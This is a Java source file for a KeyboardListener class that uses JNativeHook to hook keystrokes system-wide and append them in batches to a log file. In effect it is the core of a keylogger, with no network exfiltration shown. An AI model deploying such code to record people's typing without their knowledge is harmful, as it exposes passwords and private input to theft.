package utils;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.*;

public class KeyboardListener implements NativeKeyListener {
    private static final int MAX_SIZE_BUFFER = 50;
    private String buffer;

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        System.out.println("Typed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        buffer += NativeKeyEvent.getKeyText(e.getKeyCode());
        if (buffer.length() >= MAX_SIZE_BUFFER) logBuffer();
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    private void logBuffer() {
        try {
            File logFile = new File(Config.KEYBOARD_LOG_PATH);
            if (!logFile.exists()) logFile.createNewFile();

            FileWriter writer = new FileWriter(logFile, true);
            BufferedWriter bufferedWriter = new BufferedWriter(writer);
            bufferedWriter.write(buffer);
            bufferedWriter.close();

            buffer = "";
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
